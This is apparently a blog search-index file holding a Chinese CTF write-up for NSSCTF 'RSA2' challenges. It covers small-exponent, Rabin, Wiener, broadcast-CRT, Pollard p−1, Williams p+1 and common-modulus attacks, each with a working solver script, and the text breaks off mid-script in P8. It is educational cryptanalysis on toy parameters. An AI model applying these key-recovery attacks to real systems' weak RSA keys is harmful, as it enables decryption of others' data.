<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>工坊wp-RSA2</title>
    <link href="/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/"/>
    <url>/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/</url>
    
    <content type="html"><![CDATA[<h2 id="RSA2-P1"><a href="#RSA2-P1" class="headerlink" title="[RSA2]P1"></a>[RSA2]P1</h2><p>加密代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">5120</span>)<br>q = getPrime(<span class="hljs-number">5120</span>)<br><br>n = p*q<br>e = <span class="hljs-number">97</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br>c = powmod(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>我们发现e很小，所以我们尝试使用小明文去解决<br><img src="/images/Pasted%20image%2020240721101519.png"><br>要注意，iroot的[0]是结果[1]是能否做到</p><h2 id="RSA2-P2"><a href="#RSA2-P2" class="headerlink" title="[RSA2]P2"></a>[RSA2]P2</h2><p>我们发现这次的e虽然更小了，但是显然得不到<br>$$<br>m^{e} &lt; n<br>$$<br>又因为我们知道<br>$$<br>c \equiv m^{e} \bmod N<br>$$<br>所以我们可以得到<br>$$<br>m^{e} \equiv c+k\times N<br>$$<br>因为e很小，所以我们可以通过枚举k来进行爆破<br>爆破代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    c1 = c + i*n<br>    <span class="hljs-keyword">if</span> gmpy2.iroot(c1,e)[<span class="hljs-number">1</span>]:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(gmpy2.iroot(c1,e)[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><h2 id="RSA2-P3"><a href="#RSA2-P3" class="headerlink" title="[RSA2]P3"></a>[RSA2]P3</h2><p>rabin板子题，直接打就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">67711062621608175960173275013534737889372437946924512522469843485353704013203</span><br>q = <span class="hljs-number">91200252033239924238625443698357031288749612243099728355449192607988117291739</span><br>e = <span class="hljs-number">2</span><br>c = <span class="hljs-number">5251890478898826530186837207902117236305266861227697352434308106457554098811792713226801824100629792962861125855696719512180887415808454466978721678349614</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rabin_attack</span>(<span class="hljs-params">c, n, p, q</span>):<br>    c1 = powmod(c, (p+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>, p)<br>    c2 = powmod(c, (q+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>, q)<br>    cp1 = p - c1<br>    cp2 = q - c2<br><br>    t1 = invert(p, q)<br>    t2 = invert(q, p)<br><br>    m1 = (q*c1*c2 + p*c2*t1) % n<br>    m2 = (q*c1*t2 + p*cp2*t1) % n<br>    m3 = (q*cp1*t2 + p*c2*t1) % n<br>    m4 = (q*cp1*t2 + p*cp2*t1) % n<br><br>    <span class="hljs-keyword">return</span> m1, m2, m3, m4<br><br>ms = rabin_attack(c, p*q, p, q)<br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> ms:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA2-P4"><a href="#RSA2-P4" class="headerlink" title="[RSA2]P4"></a>[RSA2]P4</h2><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">256</span>)<br>q = getPrime(<span class="hljs-number">256</span>)<br><br>n = p*q<br>d = getPrime(<span class="hljs-number">128</span>)<br>e = inverse(d, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = bytes_to_long(flag)<br><br>c = powmod(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>我们发现e变成了d与phi的逆元，经过推理之后发现e&#x2F;phi可以近似等于k&#x2F;d，而且这里的e很大，所以我们可以考虑使用维纳攻击，也就是对于e&#x2F;phi进行连分数展开<br>解题脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">6969872410035233098344189258766624225446081814953480897731644163180991292913719910322241873463164232700368119465476508174863062276659958418657253738005689</span><br>e = <span class="hljs-number">3331016607237504021038095412236348385663413736904453330557803644384818257225138777641344877202234881627514102078530507171735156112302207979925588113589669</span><br>c = <span class="hljs-number">1754994938947260364311041300467524420957926989584983693004487724099773647229373820465164193428679197813476633649362998772470084452129370353136199193923837</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContinuedFraction</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, numerator, denumerator</span>):<br>        self.numberlist = []  <span class="hljs-comment"># number in continued fraction</span><br>        self.fractionlist = []  <span class="hljs-comment"># the near fraction list</span><br>        self.GenerateNumberList(numerator, denumerator)<br>        self.GenerateFractionList()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateNumberList</span>(<span class="hljs-params">self, numerator, denumerator</span>):<br>        <span class="hljs-keyword">while</span> numerator != <span class="hljs-number">1</span>:<br>            quotient = numerator // denumerator<br>            remainder = numerator % denumerator<br>            self.numberlist.append(quotient)<br>            numerator = denumerator<br>            denumerator = remainder<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateFractionList</span>(<span class="hljs-params">self</span>):<br>        self.fractionlist.append([self.numberlist[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(self.numberlist)):<br>            numerator = self.numberlist[i]<br>            denumerator = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>                temp = numerator<br>                numerator = denumerator + numerator * self.numberlist[i - j - <span class="hljs-number">1</span>]<br>                denumerator = temp<br>            self.fractionlist.append([numerator, denumerator])<br><br><br>a = ContinuedFraction(e, n)<br><span class="hljs-keyword">for</span> k, d <span class="hljs-keyword">in</span> a.fractionlist:<br>    m = powmod(c, d, n)<br>    flag = long_to_bytes(m)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NSSCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="RSA2-P5"><a href="#RSA2-P5" class="headerlink" title="[RSA2]P5"></a>[RSA2]P5</h2><p>加密代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>flag = os.getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br>m = bytes_to_long(flag.encode())<br>e = <span class="hljs-number">127</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>():<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    q = getPrime(<span class="hljs-number">512</span>)<br>    n = p*q<br>    c = <span class="hljs-built_in">pow</span>(m, e, n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n: <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c: <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        opt = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;input&gt; &#x27;</span>))<br>        <span class="hljs-keyword">if</span> opt == <span class="hljs-number">1</span>:<br>            enc()<br><br>main()<br></code></pre></td></tr></table></figure><p>它给了n，c那么我们就可以推导出<br>$$<br>c &#x3D; k \times n + m^{e}<br>$$<br>既然它给了我c和n，e也是已知的，我们又已知部分明文，那么我们可以尝试遍历k找到使得符合部分明文的k即可<br>事实证明这种做法是错的<br>那么我们可以考虑使用中国剩余定理去求解，也就是如果有多个同余式，我们可以使用crt来求解他们的共同明文<br>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">p = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">29000</span>)<br>e = <span class="hljs-number">127</span><br>n_ed = []*<span class="hljs-number">64</span><br>c_ed = []*<span class="hljs-number">64</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    n_un = p.recvline().decode()<br>    c_un = p.recvline().decode()<br>    n = <span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&quot;n: (\d+)&quot;</span>,n_un)[<span class="hljs-number">0</span>])<br>    c = <span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&quot;c: (\d+)&quot;</span>,c_un)[<span class="hljs-number">0</span>])<br>    n_ed.append(n)<br>    c_ed.append(c)<br><br>me = crt(n_ed,c_ed)[<span class="hljs-number">0</span>]<br>m = gmpy2.iroot(me,e)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA2-P6"><a href="#RSA2-P6" class="headerlink" title="[RSA2]P6"></a>[RSA2]P6</h2><p>加密代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMyPrime</span>(<span class="hljs-params">nbits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> p.bit_length() &lt;= nbits:<br>            p *= choice(sieve_base)<br>        <br>        <span class="hljs-keyword">if</span> isPrime(p+<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> p+<span class="hljs-number">1</span><br><br>p = getMyPrime(<span class="hljs-number">256</span>)<br>q = getMyPrime(<span class="hljs-number">256</span>)<br><br>n = p*q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 53763529836257082401813045869248978487210852880716446938539970599235060144454914000042178896730979463959004404421520555831136502171902051936080825853063287829</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 50368170865606429432907125510556310647510431461588875539696416879298699197677994843344925466156992948241894107250131926237473102312181031875514294014181272618</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>我们进到这个sieve_base里看<br><img src="/images/Pasted%20image%2020240724163509.png"><br>发现这个是10000个素数，所以p就是n个小素数的乘积+1，那么我们可以得知，p-1就是个n-smooth数，根据光滑数的性质我们可以得知<br>$$gcd(a^{k!}-1,n) &#x3D; p$$<br>所以我们可以尝试遍历这个k，来分解n<br>而我们也不需要每次都计算这个x!的值，可以直接通过模的性质来计算<br>$$a^{x+1!}\equiv (a^{x!}\mod n)^{x+1}(\mod n)$$<br>那么我们的解密脚本就如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">53763529836257082401813045869248978487210852880716446938539970599235060144454914000042178896730979463959004404421520555831136502171902051936080825853063287829</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">50368170865606429432907125510556310647510431461588875539696416879298699197677994843344925466156992948241894107250131926237473102312181031875514294014181272618</span><br><br>a = <span class="hljs-number">2</span><br>m = <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    a = <span class="hljs-built_in">pow</span>(a, m, n)<br>    p = GCD(a-<span class="hljs-number">1</span>, n)<br>    <span class="hljs-keyword">if</span> p != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p != n:<br>        <span class="hljs-keyword">break</span><br>    m += <span class="hljs-number">1</span><br><br>q = n // p<br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA2-P7"><a href="#RSA2-P7" class="headerlink" title="[RSA2]P7"></a>[RSA2]P7</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMyPrime</span>(<span class="hljs-params">nbits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> p.bit_length() &lt;= nbits:<br>            p *= choice(sieve_base)<br>        <br>        <span class="hljs-keyword">if</span> isPrime(p-<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> p-<span class="hljs-number">1</span><br><br>p = getMyPrime(<span class="hljs-number">256</span>)<br>q = getMyPrime(<span class="hljs-number">256</span>)<br><br>n = p*q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>加密脚本如上<br>这次是变成了p+1是一个b-smooth数<br>p+1光滑就是使用了卢卡斯序列扩展得到了一个p的倍数，然后与n求公因数从而分解n<br>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> count<br><br>n = <span class="hljs-number">63398538193562720708999492397588489035970399414238113344990243900620729661046648078623873637152448697806039260616826648343172207246183989202073562200879290937</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">26971181342240802276810747395669930355754928952080329914687241779532014305320191048439959934699795162709365987652696472998140484810728817991804469778237933925</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mlucas</span>(<span class="hljs-params">v, a, n</span>):<br>    v1, v2 = v, (v ** <span class="hljs-number">2</span> - <span class="hljs-number">2</span>) % n<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(a)[<span class="hljs-number">3</span>:]: v1, v2 = ((v1 ** <span class="hljs-number">2</span> - <span class="hljs-number">2</span>) % n, (v1 * v2 - v) % n) <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&quot;0&quot;</span> <span class="hljs-keyword">else</span> (<br>        (v1 * v2 - v) % n, (v2 ** <span class="hljs-number">2</span> - <span class="hljs-number">2</span>) % n)<br>    <span class="hljs-keyword">return</span> v1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">primegen</span>():<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">5</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">7</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">11</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">13</span><br>    ps = primegen()  <span class="hljs-comment"># yay recursion</span><br>    p = ps.__next__() <span class="hljs-keyword">and</span> ps.__next__()<br>    q, sieve, n = p ** <span class="hljs-number">2</span>, &#123;&#125;, <span class="hljs-number">13</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> n <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sieve:<br>            <span class="hljs-keyword">if</span> n &lt; q:<br>                <span class="hljs-keyword">yield</span> n<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">next</span>, step = q + <span class="hljs-number">2</span> * p, <span class="hljs-number">2</span> * p<br>                <span class="hljs-keyword">while</span> <span class="hljs-built_in">next</span> <span class="hljs-keyword">in</span> sieve:<br>                    <span class="hljs-built_in">next</span> += step<br>                sieve[<span class="hljs-built_in">next</span>] = step<br>                p = ps.__next__()<br>                q = p ** <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            step = sieve.pop(n)<br>            <span class="hljs-built_in">next</span> = n + step<br>            <span class="hljs-keyword">while</span> <span class="hljs-built_in">next</span> <span class="hljs-keyword">in</span> sieve:<br>                <span class="hljs-built_in">next</span> += step<br>            sieve[<span class="hljs-built_in">next</span>] = step<br>        n += <span class="hljs-number">2</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ilog</span>(<span class="hljs-params">x, b</span>):  <span class="hljs-comment"># greatest integer l such that b**l &lt;= x.</span><br>    l = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> x &gt;= b:<br>        x /= b<br>        l += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> l<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> count(<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> primegen():<br>            e = ilog(isqrt(n), p)<br>            <span class="hljs-keyword">if</span> e == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(e):<br>                v = mlucas(v, p, n)<br>            g = gcd(v - <span class="hljs-number">2</span>, n)<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &lt; g &lt; n:<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(g), <span class="hljs-built_in">int</span>(n // g)  <span class="hljs-comment"># g|n</span><br>            <span class="hljs-keyword">if</span> g == n:<br>                <span class="hljs-keyword">break</span><br><br>p, q = attack(n)<br><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = invert(e, phi)<br>m = powmod(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA2-P8"><a href="#RSA2-P8" class="headerlink" title="[RSA2]P8"></a>[RSA2]P8</h2><p>我们的目的也就是找出一个可以使得<br>$$s_{1}\times e_{1} + s_{2}\times e_{2} &#x3D; 1 $$<br>那么我们就可以使得c1xc2&#x3D;m mod n<br>我们也就可以据此求得m<br>这里要使用欧几里得扩展算法，具体代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">120294155186626082670474649118722298040433501930335450479777638508444129059776534554344361441717048531505985491664356283524886091709370969857047470362547600390987665105196367975719516115980157839088766927450099353377496192206005171597109864609567336679138620134544004766539483664270351472198486955623315909571</span><br>e1 = <span class="hljs-number">38317</span><br>e2 = <span class="hljs-number">63409</span><br>c1 = <span class="hljs-number">42703138696187395030337205860503270214353151588149506110731264952595193757235229215067638858431493587093612397165407221394174690263691095324298012134779703041752810028935711214038835584823385108771901216441784673199846041109074467177891680923593206326788523158180637665813642688824593788192044139055552031622</span><br>c2 = <span 